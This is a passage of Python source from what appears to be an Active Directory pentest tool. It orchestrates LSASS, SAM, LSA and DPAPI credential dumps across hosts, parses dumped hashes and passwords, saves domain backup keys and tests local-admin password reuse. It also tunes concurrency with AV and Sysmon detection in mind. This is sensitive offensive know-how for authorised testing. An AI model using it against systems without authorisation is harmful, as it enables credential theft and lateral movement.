        domain_data=shell.domains_data.get(domain, {}),
    )
    if hosts_file:
        targeting_notice = consume_service_targeting_fallback_notice(
            shell,
            workspace_dir=workspace_dir,
            domains_dir=shell.domains_dir,
            domain=domain,
            service="smb",
            source=source,
        )
        if targeting_notice:
            print_info(targeting_notice)
        print_info_debug(
            f"[dumps] using domain target file source={source} "
            f"for {mark_sensitive(domain, 'domain')}: "
            f"{mark_sensitive(hosts_file, 'path')}"
        )
    return hosts_file


def _native_dump_concurrency(dump_kind: str) -> int:
    """Per-type bounded concurrency.

    LSASS creates a minidump on disk and triggers AV/Sysmon; keep it low.
    SAM/LSA are registry-only and tolerate higher parallelism safely.
    """
    if dump_kind == "lsass":
        raw = os.environ.get("ADSCAN_LSASS_DUMP_CONCURRENCY", "5")
        default = 5
    elif dump_kind in ("sam", "lsa"):
        raw = os.environ.get("ADSCAN_NATIVE_DUMP_CONCURRENCY", "20")
        default = 20
    else:
        raw = os.environ.get("ADSCAN_NATIVE_DUMP_CONCURRENCY", "15")
        default = 15
    try:
        return max(1, min(64, int(str(raw).strip())))
    except ValueError:
        return default


# Keep legacy alias so any external caller still compiles.
def _native_bulk_concurrency() -> int:
    return _native_dump_concurrency("sam")


# ---------------------------------------------------------------------------
# LSASS campaign helpers
# ---------------------------------------------------------------------------

_LSASS_DA_KEYWORDS: frozenset[str] = frozenset(
    {"administrator", "admin", "da", "domainadmin", "krbtgt", "svc_"}
)


def _lsass_is_da_hint(username: str) -> bool:
    u = username.lower()
    return any(kw in u for kw in _LSASS_DA_KEYWORDS)


def _lsass_smart_targets(shell: Any, domain: str) -> tuple[list[str], str]:
    """Return (dc_hosts, tier_label) for smart LSASS targeting.

    Priority: dcs.txt → pdc from domain_data → empty.
    Callers fall back to the full host list when this returns empty.
    """
    domains_dir: str = getattr(shell, "domains_dir", "") or ""
    dcs_path = domain_relpath(domains_dir, domain, "dcs.txt")
    if os.path.isfile(dcs_path):
        hosts = _load_native_bulk_hosts(dcs_path)
        if hosts:
            return hosts, "DCs"
    pdc = str(shell.domains_data.get(domain, {}).get("pdc") or "").strip()
    if pdc:
        return [pdc], "PDC only"
    return [], ""


@dataclass
class _LsassCampaignResult:
    host: str
    success: bool
    cred_count: int
    has_da_hint: bool
    method_used: str
    error: str | None


def _lsass_campaign_confirmation(
    dc_hosts: list[str],
    tier_label: str,
    all_hosts: list[str],
    method: "LsassMethod",
) -> tuple[bool, list[str]]:
    """Show pre-campaign confirmation panel. Returns (proceed, selected_hosts)."""
    from rich.prompt import Confirm as _RConfirm

    concurrency = _native_dump_concurrency("lsass")
    n = len(dc_hosts)
    est_s = max(n // concurrency, 1) * 25
    est_label = f"~{est_s // 60}m {est_s % 60}s" if est_s >= 60 else f"~{est_s}s"

    lines = [
        f"[{_MUTED}]  Targeting  [/{_MUTED}] [{_ICE}]{tier_label}[/{_ICE}]"
        f"  [{_MUTED}]({n} hosts)[/{_MUTED}]",
        f"[{_MUTED}]  Method     [/{_MUTED}] [{_ACID}]{method.display}[/{_ACID}]",
        f"[{_MUTED}]  Concurrent [/{_MUTED}] [{_MUTED}]{concurrency} parallel[/{_MUTED}]",
        f"[{_MUTED}]  Est. time  [/{_MUTED}] [{_MUTED}]{est_label}[/{_MUTED}]",
        f"[{_MUTED}]  Noise      [/{_MUTED}] [{_AMBER}]Sysmon Event 10 × {n} hosts[/{_AMBER}]",
    ]
    _CONSOLE.print(
        Panel(
            "\n".join(lines),
            title=f"[bold {_ICE}]◉  LSASS Campaign[/bold {_ICE}]",
            border_style=_ICE,
            padding=(0, 1),
        )
    )

    selected = dc_hosts
    if all_hosts and len(all_hosts) > len(dc_hosts):
        if _RConfirm.ask(
            f"  [{_AMBER}]Expand to all {len(all_hosts)} hosts?[/{_AMBER}]",
            default=False,
        ):
            selected = all_hosts

    return _RConfirm.ask(f"  [{_ICE}]Proceed?[/{_ICE}]", default=True), selected


def _render_lsass_campaign_summary(
    results: list[_LsassCampaignResult],
) -> None:
    total = len(results)
    succeeded = sum(1 for r in results if r.success)
    total_creds = sum(r.cred_count for r in results)
    da_hosts = [r.host for r in results if r.has_da_hint]

    lines = [
        f"[{_MUTED}]  Hosts  [/{_MUTED}] [{_ICE}]{total}[/{_ICE}] targeted"
        f"  [{_ACID}]{succeeded}[/{_ACID}] ok"
        f"  [{_LAVA}]{total - succeeded}[/{_LAVA}] failed",
        f"[{_MUTED}]  Creds  [/{_MUTED}] [{_ACID}]{total_creds}[/{_ACID}] accounts extracted",
    ]
    if da_hosts:
        lines += ["", f"[{_AMBER}]  ⚡  HIGH VALUE[/{_AMBER}]"]
        for h in da_hosts[:5]:
            lines.append(f"[{_AMBER}]     {h}  ·  privileged session[/{_AMBER}]")
        if len(da_hosts) > 5:
            lines.append(f"[{_MUTED}]     … and {len(da_hosts) - 5} more[/{_MUTED}]")
        lines.append(
            f"\n[{_AMBER}]  → DA-level sessions found on {len(da_hosts)}"
            f" host{'s' if len(da_hosts) != 1 else ''}[/{_AMBER}]"
        )

    border = _ACID if total_creds > 0 else _LAVA
    title = (
        f"[bold {_ACID}]✓  Campaign Complete[/bold {_ACID}]"
        if total_creds > 0
        else f"[bold {_LAVA}]✗  Campaign Failed[/bold {_LAVA}]"
    )
    _CONSOLE.print(
        Panel("\n".join(lines), title=title, border_style=border, padding=(0, 1))
    )


def _load_native_bulk_hosts(path: str) -> list[str]:
    """Load host targets from a plaintext target file."""
    hosts: list[str] = []
    seen: set[str] = set()
    try:
        with open(path, encoding="utf-8", errors="ignore") as handle:
            for raw_line in handle:
                line = raw_line.strip()
                if not line or line.startswith("#"):
                    continue
                host = line.split()[0].strip()
                if not host:
                    continue
                key = host.lower()
                if key in seen:
                    continue
                seen.add(key)
                hosts.append(host)
    except OSError as exc:
        telemetry.capture_exception(exc)
        print_error(
            f"Could not read native dump target file: {mark_sensitive(path, 'path')}"
        )
    return hosts


def _resolve_native_bulk_hosts(
    shell: Any,
    *,
    domain: str,
    requested_host: str,
) -> list[str]:
    """Resolve bulk dump hosts from `All` or an explicit target file."""
    hosts_file = _resolve_bulk_hosts_target(
        shell,
        domain=domain,
        requested_host=requested_host,
    )
    if not hosts_file:
        return []
    return _load_native_bulk_hosts(hosts_file)


@dataclass(frozen=True)
class ParsedDpapiCredential:
    """Normalized DPAPI credential parsed from historical command output."""

    domain: str | None
    username: str
    password: str
    host: str | None


def _ensure_pro_for_all_hosts_dump(shell: Any, *, dump_label: str) -> bool:
    """Validate policy for dump operations targeting all hosts."""
    _ = shell
    _ = dump_label
    return True


def _extract_dumped_credentials_with_hosts(
    output: str,
    *,
    excluded_substrings: set[str] | None = None,
) -> list[tuple[str, str | None]]:
    """Extract dumped credential tokens and best-effort source host from command output."""
    if not output:
        return []

    excluded_lower = {value.lower() for value in (excluded_substrings or set())}
    current_host: str | None = None
    seen: set[str] = set()
    results: list[tuple[str, str | None]] = []

    for raw_line in output.splitlines():
        line = strip_ansi_codes(raw_line)
        if "(pwn3d!)" in line.lower() or _NXC_STATUS_TOKEN_RE.search(line):
            # Authentication success lines are not dumped credentials.
            continue
        host_match = _NXC_SMB_LINE_RE.match(line)
        if host_match:
            host_candidate = str(host_match.group("host") or "").strip()
            if host_candidate:
                current_host = host_candidate

        for pattern in (
            _NXC_DUMPED_CREDENTIAL_TOKEN_RE,
            _NXC_DUMPED_UPN_CREDENTIAL_TOKEN_RE,
            _NXC_DUMPED_SAM_TOKEN_RE,
        ):
            for match in pattern.finditer(line):
                token = match.group("token").strip().strip(",;\"'")
                if not token:
                    continue
                token_lower = token.lower()
                if excluded_lower and any(
                    excl in token_lower for excl in excluded_lower
                ):
                    continue
                dedupe_key = f"{token_lower}|{str(current_host or '').lower()}"
                if dedupe_key in seen:
                    continue
                seen.add(dedupe_key)
                results.append((token, current_host))

    return results


def _parse_identity_domain_username(identity: str) -> tuple[str | None, str]:
    """Split a tool-style identity into domain and username components."""
    identity_clean = str(identity or "").strip()
    if "\\" in identity_clean:
        domain_name, username = identity_clean.split("\\", 1)
        return domain_name.strip() or None, username.strip()
    if "@" in identity_clean:
        username, domain_name = identity_clean.split("@", 1)
        return domain_name.strip() or None, username.strip()
    return None, identity_clean


def _parse_dpapi_credential_from_line(
    line: str,
    *,
    current_host: str | None,
) -> ParsedDpapiCredential | None:
    """Parse a DPAPI credential from a single command-output line."""
    if "[CREDENTIAL]" in line:
        payload = line.split("[CREDENTIAL]", 1)[1].strip()
        for pattern in (
            _NXC_DUMPED_CREDENTIAL_TOKEN_RE,
            _NXC_DUMPED_UPN_CREDENTIAL_TOKEN_RE,
        ):
            match = pattern.search(payload)
            if not match:
                continue
            token = str(match.group("token") or "").strip().strip(",;\"'")
            if not token or ":" not in token:
                continue
            identity, password = token.rsplit(":", 1)
            domain_name, username = _parse_identity_domain_username(identity)
            if username and password:
                return ParsedDpapiCredential(
                    domain=domain_name,
                    username=username,
                    password=password,
                    host=current_host,
                )

    if "target=" in line and " - " in line:
        match = re.search(
            r"(?:Domain|Target):target=(?P<domain>[^\s]+)\s+-\s+(?P<identity>[^\s:]+):(?P<password>\S+)",
            line,
            flags=re.IGNORECASE,
        )
        if match:
            domain_name = str(match.group("domain") or "").strip() or None
            identity = str(match.group("identity") or "").strip()
            password = str(match.group("password") or "").strip()
            parsed_domain, username = _parse_identity_domain_username(identity)
            return ParsedDpapiCredential(
                domain=parsed_domain or domain_name,
                username=username,
                password=password,
                host=current_host,
            )

    return None


def _extract_dpapi_credentials_with_hosts(output: str) -> list[ParsedDpapiCredential]:
    """Extract DPAPI credentials from historical SMB or WinRM command output."""
    if not output:
        return []

    current_host: str | None = None
    seen: set[tuple[str, str, str | None, str | None]] = set()
    results: list[ParsedDpapiCredential] = []

    for raw_line in output.splitlines():
        line = strip_ansi_codes(raw_line)
        host_match = _NXC_REMOTE_LINE_RE.match(line)
        if host_match:
            host_candidate = str(host_match.group("host") or "").strip()
            if host_candidate:
                current_host = host_candidate

        parsed = _parse_dpapi_credential_from_line(line, current_host=current_host)
        if parsed is None:
            continue
        dedupe_key = (
            str(parsed.domain or "").lower(),
            parsed.username.lower(),
            parsed.password,
            str(parsed.host or "").lower() or None,
        )
        if dedupe_key in seen:
            continue
        seen.add(dedupe_key)
        results.append(parsed)

    return results


def _resolve_step_host(
    *,
    parsed_host: str | None,
    requested_host: str,
) -> str | None:
    """Resolve host to use for credential source step creation."""
    if parsed_host:
        return parsed_host
    requested_clean = str(requested_host or "").strip()
    if (
        requested_clean
        and requested_clean.lower() != "all"
        and not _is_hosts_file_target(requested_clean)
    ):
        return requested_clean
    return None


def _is_hosts_file_target(requested_host: str) -> bool:
    """Return True when requested host points to a targets file."""
    requested_clean = str(requested_host or "").strip()
    if not requested_clean:
        return False
    if requested_clean.lower() == "all":
        return False
    if not (requested_clean.endswith(".txt") or os.path.sep in requested_clean):
        return False
    return os.path.isfile(requested_clean)


def _extract_username_from_lsa_identity(identity: str) -> str:
    """Return normalized username from LSA identity (DOMAIN\\user or user@domain)."""
    identity_clean = str(identity or "").strip()
    if "\\" in identity_clean:
        return identity_clean.split("\\")[-1].strip()
    if "@" in identity_clean:
        return identity_clean.split("@", 1)[0].strip()
    return identity_clean


def _is_bulk_dump_target(requested_host: str) -> bool:
    """Return True when dump target represents multiple hosts."""
    requested_clean = str(requested_host or "").strip()
    return requested_clean.lower() == "all" or _is_hosts_file_target(requested_clean)


def _dump_target_token(requested_host: str) -> str:
    """Return safe token for dump output filenames."""
    requested_clean = str(requested_host or "").strip()
    if requested_clean.lower() == "all":
        return "all"
    if _is_hosts_file_target(requested_clean):
        requested_clean = os.path.splitext(os.path.basename(requested_clean))[0]
    token = re.sub(r"[^A-Za-z0-9_.-]+", "_", requested_clean).strip("_")
    return token or "target"


def _dump_output_path(
    *,
    domains_dir: str,
    domain: str,
    dump_kind: str,
    requested_host: str,
) -> str:
    """Build normalized dump output path for SAM/LSA/DPAPI logs."""
    if str(requested_host or "").strip().lower() == "all":
        filename = f"dump_all_{dump_kind}.txt"
    else:
        filename = f"dump_{_dump_target_token(requested_host)}_{dump_kind}.txt"
    return domain_relpath(domains_dir, domain, "smb", filename)


def _resolve_dump_command_timeout(requested_host: str) -> int:
    """Return command timeout based on dump scope."""
    if _is_bulk_dump_target(requested_host):
        return _BULK_DUMP_COMMAND_TIMEOUT_SECONDS
    return _DEFAULT_DUMP_COMMAND_TIMEOUT_SECONDS


def _record_bulk_finding(
    summary: dict[str, dict[str, Any]],
    *,
    host: str | None,
    username: str,
    is_hash: bool,
) -> None:
    """Aggregate credential findings per host for compact UX on bulk dumps."""
    host_key = str(host or "unknown host").strip() or "unknown host"
    bucket = summary.setdefault(
        host_key,
        {
            "hashes": 0,
            "passwords": 0,
            "users": set(),
        },
    )
    if is_hash:
        bucket["hashes"] += 1
    else:
        bucket["passwords"] += 1
    users = bucket.get("users")
    if isinstance(users, set):
        users.add(str(username or "").strip())


def _print_bulk_summary(*, dump_kind: str, summary: dict[str, dict[str, Any]]) -> None:
    """Render aggregated credential findings for bulk dump operations."""
    if not summary:
        return

    rows: list[dict[str, Any]] = []
    for host_name in sorted(summary.keys()):
        bucket = summary.get(host_name, {})
        users = bucket.get("users")
        users_count = len(users) if isinstance(users, set) else 0
        credentials_list: list[str] = []
        if isinstance(users, set):
            credentials_list = sorted(
                mark_sensitive(str(user), "user") for user in users if str(user).strip()
            )
        credentials_display = ", ".join(credentials_list) if credentials_list else "-"
        rows.append(
            {
                "Host": mark_sensitive(host_name, "hostname"),
                "Users": users_count,
                "Hashes": int(bucket.get("hashes", 0)),
                "Passwords": int(bucket.get("passwords", 0)),
                "Credentials": credentials_display,
            }
        )

    title = f"{dump_kind} Credential Summary by Host"
    print_info_table(
        rows, ["Host", "Users", "Hashes", "Passwords", "Credentials"], title=title
    )


def _record_bulk_credential(
    bucket: dict[tuple[str, str, bool], dict[str, Any]],
    *,
    username: str,
    credential: str,
    is_hash: bool,
    host: str | None,
) -> None:
    """Aggregate credentials for bulk dumps to avoid duplicate verification calls."""
    key = (str(username or "").strip().lower(), str(credential or "").strip(), is_hash)
    entry = bucket.setdefault(
        key,
        {
            "username": str(username or "").strip(),
            "credential": str(credential or "").strip(),
            "is_hash": is_hash,
            "hosts": set(),
        },
    )
    hosts = entry.get("hosts")
    if isinstance(hosts, set):
        hosts.add(str(host).strip() if host else "")


def _persist_bulk_credentials(
    shell: Any,
    *,
    domain: str,
    dump_kind: str,
    auth_username: str | None,
    credentials: dict[tuple[str, str, bool], dict[str, Any]],
    include_machine_accounts: bool = True,
) -> None:
    """Persist aggregated bulk credentials using one add_credential call per credential."""
    for entry in credentials.values():
        username = str(entry.get("username") or "").strip()
        credential = str(entry.get("credential") or "").strip()
        if not username or not credential:
            continue
        hosts = entry.get("hosts")
        host_values = (
            sorted(str(host).strip() for host in hosts if str(host).strip())
            if isinstance(hosts, set)
            else []
        )
        if host_values:
            source_steps: list[object] = []
            for host_value in host_values:
                source_steps.extend(
                    _build_dump_source_steps(
                        domain=domain,
                        dump_kind=dump_kind,
                        host=host_value,
                        auth_username=auth_username,
                        credential_username=username,
                        secret=credential,
                    )
                )
        else:
            source_steps = _build_dump_source_steps(
                domain=domain,
                dump_kind=dump_kind,
                host=None,
                auth_username=auth_username,
                credential_username=username,
                secret=credential,
            )
        _DUMP_KIND_ORIGINS: dict[str, str] = {
            "DPAPI": "dpapi",
            "LSA": "lsa_secrets",
            "SAM": "sam_dump",
            "LSASS": "lsass_dump",
        }
        add_kwargs: dict[str, Any] = {
            "prompt_for_user_privs_after": False,
            "ui_silent": True,
            "ensure_fresh_kerberos_ticket": False,
        }
        origin = _DUMP_KIND_ORIGINS.get(dump_kind)
        if origin:
            add_kwargs["credential_origin"] = origin
        if include_machine_accounts and username.endswith("$"):
            add_kwargs["verify_credential"] = False
            add_kwargs["skip_hash_cracking"] = True
        if source_steps:
            add_kwargs["source_steps"] = source_steps
        shell.add_credential(
            domain,
            username,
            credential,
            **add_kwargs,
        )


def _expand_bulk_local_credentials(
    credentials: dict[tuple[str, str, bool], dict[str, Any]],
) -> list[tuple[str, str, str, str]]:
    """Expand aggregated bulk credentials into host-scoped local credential tuples."""
    expanded: list[tuple[str, str, str, str]] = []
    seen: set[tuple[str, str, str, str]] = set()
    for entry in credentials.values():
        username = str(entry.get("username") or "").strip()
        credential = str(entry.get("credential") or "").strip()
        if not username or not credential:
            continue
        hosts = entry.get("hosts")
        host_values = (
            sorted(str(host).strip() for host in hosts if str(host).strip())
            if isinstance(hosts, set)
            else []
        )
        for host in host_values:
            dedupe_key = (host.lower(), "smb", username.lower(), credential)
            if dedupe_key in seen:
                continue
            seen.add(dedupe_key)
            expanded.append((host, "smb", username, credential))
    return expanded


def _persist_bulk_sam_local_credentials(
    shell: Any,
    *,
    domain: str,
    credentials: dict[tuple[str, str, bool], dict[str, Any]],
) -> None:
    """Persist bulk SAM credentials as local host-scoped credentials.

    SAM extraction yields local accounts. In bulk mode we must never route these
    through domain credential verification. Credentials are persisted without
    local verification and without post-add local-reuse prompts because reuse is
    handled explicitly in the SAM reuse validation phase.
    """
    expanded = _expand_bulk_local_credentials(credentials)
    if not expanded:
        return

    add_local_batch = getattr(shell, "add_local_credentials_batch", None)
    if callable(add_local_batch):
        try:
            add_local_batch(
                domain=domain,
                credentials=expanded,
                skip_hash_cracking=False,
                verify_local_credential=False,
                prompt_local_reuse_after=False,
                ui_silent=True,
                credential_origin="sam_dump",
            )
            return
        except TypeError:
            # Backward compatibility for shells exposing legacy signatures.
            pass

    for host, service, username, credential in expanded:
        shell.add_credential(
            domain,
            username,
            credential,
            host=host,
            service=service,
            prompt_for_user_privs_after=False,
            verify_local_credential=False,
            prompt_local_reuse_after=False,
            ui_silent=True,
            ensure_fresh_kerberos_ticket=False,
            credential_origin="sam_dump",
        )


def _load_dpapi_ad_users(shell: Any, domain: str) -> set[str]:
    """Return lowercase set of enabled AD users from the workspace file."""
    try:
        domains_dir = getattr(shell, "domains_dir", "") or ""
        path = domain_relpath(domains_dir, domain, "enabled_users.txt")
        if not os.path.exists(path):
            return set()
        with open(path, encoding="utf-8") as fh:
            return {line.strip().lower() for line in fh if line.strip()}
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        return set()


def _persist_dpapi_result(
    shell: Any,
    result: "DpapiFullDumpResult",
    *,
    domain: str,
    host: str,
    enriched: "list | None" = None,
    source_protocol: str = "smb",
) -> None:
    """Persist DPAPI dump result to workspace file + credentials store.

    When ``enriched`` is provided (list of ``DpapiVerifiedCredential``), the
    intel file includes classification + verification status for every
    credential and only domain-verified entries are added to the workspace
    credential store. Raw result.credentials are used as fallback.
    """
    from adscan_internal.services.exploitation.dpapi_credential_processor import (
        DpapiVerifiedCredential,
    )

    domains_dir = getattr(shell, "domains_dir", "") or ""
    if not domains_dir:
        return

    # Human-readable intel file (written regardless of verification outcome).
    output_path = _dump_output_path(
        domains_dir=domains_dir,
        domain=domain,
        dump_kind="dpapi",
        requested_host=host,
    )
    try:
        lines = [
            f"# DPAPI dump  ·  {host}  ·  mode={result.mode}",
            f"# Masterkeys: {len(result.decrypted_masterkeys)}/"
            f"{len(result.decrypted_masterkeys) + len(result.locked_masterkeys)}",
            f"# Elapsed: {result.elapsed_seconds:.1f}s",
            "",
        ]
        if enriched:
            for ev in enriched:
                cred = ev.raw
                lines.append(
                    f"[{ev.kind.upper()}] [{ev.verify_status}] "
                    f"[{cred.win_user}] {cred.target} "
                    f"→ {cred.username}:{cred.password}"
                )
        else:
            for cred in result.credentials:
                lines.append(
                    f"[{cred.source.upper()}] [{cred.win_user}] {cred.target} "
                    f"→ {cred.username}:{cred.password}"
                )
        os.makedirs(os.path.dirname(output_path), exist_ok=True)
        with open(output_path, "w", encoding="utf-8") as fh:
            fh.write("\n".join(lines) + "\n")
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_info_debug(f"[dpapi] persist file failed: {exc}")

    # Backup key PVK (DA branch)
    if result.backup_key_pvk and domains_dir:
        pvk_path = os.path.join(domains_dir, domain, "smb", f"{domain}_backup.pvk")
        try:
            os.makedirs(os.path.dirname(pvk_path), exist_ok=True)
            with open(pvk_path, "wb") as fh:
                fh.write(result.backup_key_pvk)
            print_info_verbose(f"Backup key saved: {pvk_path}")
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)

    # Credentials store — STORE-FIRST: persist every recovered AD-candidate
    # plaintext, regardless of whether an immediate TGT verification succeeded.
    # A recovered plaintext domain credential is high-value evidence; losing it
    # because we could not re-auth in the moment (no PDC reachable, lockout
    # budget exhausted, transient KDC error) is a real loss — exactly the
    # vintage\\c.neri_adm case the operator flagged. Verification is a PROVENANCE
    # annotation (verified vs recovered-unverified), NOT a precondition for
    # storing. Non-AD kinds (noise / service_token / personal_web) are NOT
    # sprayable domain creds and stay excluded. The username is already a bare
    # sAMAccountName (normalized at parse in dpapi_user_decrypt), so it matches
    # its graph node and the generic ``credentials`` store key.
    if enriched:
        for ev in enriched:
            if not isinstance(ev, DpapiVerifiedCredential):
                continue
            if ev.kind != "ad_candidate":
                continue
            principal = ev.verified_ad_user or ev.raw.username
            secret = ev.verified_password or ev.raw.password
            if not principal or not secret:
                continue
            try:
                shell.add_credential(
                    domain,
                    principal,
                    secret,
                    source_steps=_build_dump_source_steps(
                        domain=domain,
                        dump_kind="DPAPI",
                        host=host,
                        auth_username=None,
                        credential_username=principal,
                        secret=secret,
                        source_protocol=source_protocol,
                    ),
                    credential_origin="dpapi",
                )
            except Exception as exc:  # noqa: BLE001
                telemetry.capture_exception(exc)
    else:
        # Fallback: no enrichment → persist all with a password (old behaviour).
        for cred in result.credentials:
            if not cred.password:
                continue
            try:
                shell.add_credential(
                    domain,
                    cred.username,
                    cred.password,
                    source_steps=_build_dump_source_steps(
                        domain=domain,
                        dump_kind="DPAPI",
                        host=host,
                        auth_username=None,
                        credential_username=cred.username,
                        secret=cred.password,
                        source_protocol=source_protocol,
                    ),
                    credential_origin="dpapi",
                )
            except Exception as exc:  # noqa: BLE001
                telemetry.capture_exception(exc)


def _run_optional_local_admin_reuse_validation(
    shell: Any,
    *,
    domain: str,
    candidates: list[dict[str, Any]],
    total_discovered: int = 0,
    excluded_by_reason: dict[str, int] | None = None,
) -> None:
    """Run optional local credential reuse validation for SAM bulk dump candidates.

    This runs active validation (`--local-auth`) only for local accounts where the
    same credential appears on multiple hosts. Confirmed admin reuse (Pwn3d) will
    record LocalAdminPassReuse attack-step edges.
    """
    from adscan_internal.cli.smb import run_local_cred_reuse

    marked_domain = mark_sensitive(domain, "domain")
    excluded_by_reason = excluded_by_reason or {}
    candidate_count = 0
    for item in candidates:
        if not isinstance(item, dict):
            continue
        username = str(item.get("username") or "").strip()
        if not username:
            continue
        candidate_count += 1

    total_excluded = int(sum(excluded_by_reason.values()))
    reasons_text = ", ".join(
        f"{_SAM_REUSE_REASON_LABELS.get(reason, reason)}={count}"
        for reason, count in sorted(excluded_by_reason.items())
    )
    if not reasons_text:
        reasons_text = "none"

    print_panel(
        "\n".join(
            [
                "[bold]Local Credential Reuse Validation[/bold]",
                f"Domain: {marked_domain}",
                "",
                "ADscan identified only reusable local credential candidates",
                "(same local credential observed across multiple hosts).",
                "Validation is optional and records paths only when admin access",
                "is confirmed (Pwn3d).",
                "",
                f"Local accounts discovered: {total_discovered}",
                f"Candidates selected: {candidate_count}",
                f"Excluded: {total_excluded}",
                f"Exclusion reasons: {reasons_text}",
            ]
        ),
        title="[bold magenta]SAM Reuse Validation[/bold magenta]",
        border_style="magenta",
        expand=False,
    )
    if candidate_count == 0:
        print_info(
            f"Skipping local credential reuse validation in {marked_domain}: no reusable local credentials were detected."
        )
        return

    if not confirm_operation(
        operation_name="Local Credential Reuse Validation",
        description=(
            "Validates only reusable local credentials and records LocalAdminPassReuse "
            "steps when admin access is confirmed."
        ),
        context={
            "Domain": marked_domain,
            "Reusable Candidates": str(candidate_count),
            "Discovery Scope": "SAM dump (all hosts)",
            "Validation Method": "native local-auth (admin access required)",
        },
        default=True,
        icon="🔁",
        show_panel=True,
    ):
        print_info(
            f"Skipped local credential reuse validation for {marked_domain} by user choice."
        )
        return
    resolved_candidates = _resolve_reuse_candidate_credentials(
        shell=shell,
        candidates=candidates,
    )
    resolved_rows = _build_resolved_reuse_candidate_rows(
        shell=shell,
        candidates=resolved_candidates,
    )
    if resolved_rows:
        print_info_table(
            resolved_rows,
            ["User", "RID", "Hosts", "Credential Type", "Credential", "Method"],
            title="Local Credential Reuse Candidates",
        )

    by_user: dict[str, int] = {}
    for item in resolved_candidates:
        username = str(item.get("username") or "").strip().lower()
        if not username:
            continue
        by_user[username] = int(by_user.get(username, 0)) + 1
    repeated_users = sorted(
        ((user, count) for user, count in by_user.items() if count > 1),
        key=lambda entry: entry[0],
    )
    if repeated_users:
        repeated_text = ", ".join(
            f"{mark_sensitive(user, 'user')} ({count} variants)"
            for user, count in repeated_users
        )
        print_info(
            "Detected multiple credential variants for the same local account; "
            f"each variant is validated separately: {repeated_text}"
        )

    print_info(
        f"Running local credential reuse validation for {len(resolved_rows)} candidate(s) in {marked_domain}."
    )
    validation_results: list[dict[str, Any]] = []
    for item in sorted(
        resolved_candidates, key=lambda value: str(value.get("username") or "").lower()
    ):
        user_clean = str(item.get("username") or "").strip()
        cred_clean = str(item.get("credential") or "").strip()
        rid_clean = str(item.get("rid") or "").strip()
        if not user_clean or not cred_clean:
            continue
        marked_user = mark_sensitive(user_clean, "user")
        print_info(
            f"Validating local credential reuse for {marked_user} (RID {rid_clean}) across enabled hosts."
        )
        try:
            result = run_local_cred_reuse(
                shell,
                domain=domain,
                username=user_clean,
                credential=cred_clean,
                prompt_dump_after_reuse=False,
            )
            validation_results.append(
                {
                    "username": user_clean,
                    "rid": rid_clean or "-",
                    "source_hosts": int(item.get("source_hosts", 0) or 0),
                    "credential": cred_clean,
                    "credential_was_cracked": bool(item.get("credential_was_cracked")),
                    "result": result if isinstance(result, dict) else {},
                }
            )
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            print_warning(
                f"Local admin reuse validation failed for {marked_user}; continuing."
            )
            validation_results.append(
                {
                    "username": user_clean,
                    "rid": rid_clean or "-",
                    "source_hosts": int(item.get("source_hosts", 0) or 0),
                    "credential": cred_clean,
                    "credential_was_cracked": bool(item.get("credential_was_cracked")),
                    "result": {
                        "status": "error",
                        "error": str(exc),
                        "reuse_targets": [],
                        "created_edges": 0,
                    },
                }
            )

    _print_local_reuse_validation_summary(
        domain=domain,
        results=validation_results,
        title="Local Reuse Validation Summary",
    )
    _run_optional_domain_account_reuse_validation(
        shell=shell,
        domain=domain,
        candidates=resolved_candidates,
        source_scope="SAM dump (all hosts)",
        local_validation_results=validation_results,
    )


def _supports_local_reuse_execution(shell: Any) -> bool:
    """Return True when shell can execute local credential reuse validation."""
    required = (
        "is_hash",
        "execute_local_cred_reuse",
    )
    for attr in required:
        value = getattr(shell, attr, None)
        if not callable(value):
            return False
    return True


def _select_reuse_candidates_with_checkbox(
    shell: Any,
    *,
    candidates: list[dict[str, Any]],
) -> list[dict[str, Any]]:
    """Allow operator to choose reuse-validation candidates via checkbox."""
    if not candidates:
        return []

    options: list[str] = []
    option_to_candidate: dict[str, dict[str, Any]] = {}
    for idx, item in enumerate(candidates, start=1):
        username = str(item.get("username") or "").strip()
        rid = str(item.get("rid") or "-").strip() or "-"
        source_hosts = int(item.get("source_hosts", 0) or 0)
        credential = str(item.get("credential") or "").strip()
        if not username or not credential:
            continue
        if credential.lower() == _EMPTY_NTLM_HASH:
            # Never present a blank-password account as a reuse candidate.
            continue
        marked_user = mark_sensitive(username, "user")
        label = f"{idx}. {marked_user} (RID {rid}, seen on {source_hosts} host(s))"
        options.append(label)
        option_to_candidate[label] = item

    if not options:
        return []

    checkbox = getattr(shell, "_questionary_checkbox", None)
    if callable(checkbox):
        selected_labels = checkbox(
            "Select local credentials to validate for reuse:",
            options,
        )
        if selected_labels is None:
            return []
        selected = [
            option_to_candidate[label]
            for label in selected_labels
            if label in option_to_candidate
        ]
        return selected

    # Fallback when interactive checkbox is unavailable: keep all candidates.
    return list(option_to_candidate.values())


def _run_single_host_local_admin_reuse_validation(
    shell: Any,
    *,
    domain: str,
    source_host: str,
    candidates: list[dict[str, Any]],
) -> None:
    """Run optional local reuse validation for SAM dump from a single host."""
    from adscan_internal.cli.smb import run_local_cred_reuse

    if not candidates:
        return

    if not _supports_local_reuse_execution(shell):
        print_info_debug(
            "[sam_reuse] Skipping single-host local reuse validation: shell "
            "does not expose required local reuse helpers."
        )
        return

    marked_domain = mark_sensitive(domain, "domain")
    marked_source_host = mark_sensitive(source_host, "hostname")
    print_panel(
        "\n".join(
            [
                "[bold]Single-Host SAM Reuse Validation[/bold]",
                f"Domain: {marked_domain}",
                f"Source Host: {marked_source_host}",
                "",
                "Select which extracted local credentials should be tested",
                "across all enabled hosts using local-auth validation.",
                "ADscan records LocalAdminPassReuse only on confirmed Pwn3d hits.",
            ]
        ),
        title="[bold magenta]SAM Reuse Validation[/bold magenta]",
        border_style="magenta",
        expand=False,
    )

    selected_candidates = _select_reuse_candidates_with_checkbox(
        shell,
        candidates=candidates,
    )
    if not selected_candidates:
        print_info(
            f"Skipped local credential reuse validation for {marked_domain}: no candidate selected."
        )
        return

    selected_rows: list[dict[str, Any]] = []
    for item in selected_candidates:
        username = str(item.get("username") or "").strip()
        rid = str(item.get("rid") or "-").strip() or "-"
        source_hosts = int(item.get("source_hosts", 0) or 0)
        if not username:
            continue
        selected_rows.append(
            {
                "User": mark_sensitive(username, "user"),
                "RID": rid,
                "Hosts": source_hosts,
                "Method": "Local-auth reuse validation",
            }
        )

    if not selected_rows:
        print_info(
